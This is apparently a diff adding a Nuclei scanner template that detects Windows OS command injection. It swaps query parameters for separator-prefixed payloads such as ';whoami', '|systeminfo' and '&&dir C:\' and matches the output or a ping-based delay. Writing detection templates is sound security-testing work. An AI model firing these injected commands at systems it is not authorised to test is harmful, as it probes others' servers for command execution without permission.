@@ -1,0 +1,80 @@
+id: windows-command-injection
+
+info:
+  name: Windows Command Injection - Generic Fuzz Detection
+  author: Jaenact
+  severity: high
+  description: |
+    Replaces query parameter values with command-separator payloads (e.g., ;, |, &, &&)
+    and detects possible OS command execution on Windows targets by matching dir/systeminfo/whoami hints
+    or time-based delays via ping.
+    Note: requires running nuclei with -fuzz and a target URL that includes at least one query parameter.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://cwe.mitre.org/data/definitions/78.html
+    - https://capec.mitre.org/data/definitions/88.html
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 1
+  tags: dast,injection,rce,command-injection,windows,intrusive
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      windows_fuzz:
+        - ';dir'
+        - '|dir'
+        - '&dir'
+        - '&&dir'
+        - '||dir'
+        - ';whoami'
+        - '|whoami'
+        - '&&whoami'
+        - ';systeminfo'
+        - '|systeminfo'
+        - '&&systeminfo'
+        - ';ipconfig'
+        - '|ipconfig'
+        - '&&ipconfig'
+        - ';dir C:\\'
+        - '|dir C:\\'
+        - '&&dir C:\\'
+        - '&ping -n 5 127.0.0.1&'
+        - '&&ping -n 5 127.0.0.1&&'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - '{{windows_fuzz}}'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: windows-dir-output
+        part: body
+        # Typical dir output lines
+        regex:
+          - '(?m)^\\s*Directory of [A-Z]:\\\\'
+          - '(?m)^\\s*Volume in drive [A-Z]'
+
+      - type: regex
+        name: windows-systeminfo
+        part: body
+        # Robust against minor locale/case differences
+        regex:
+          - '(?mi)^OS Name:\\s'
+          - '(?mi)^Host Name:\\s'
+          - '(?mi)^Windows IP Configuration'
+
+      - type: dsl
+        name: time-based-windows
+        dsl:
+          - 'duration >= 4'
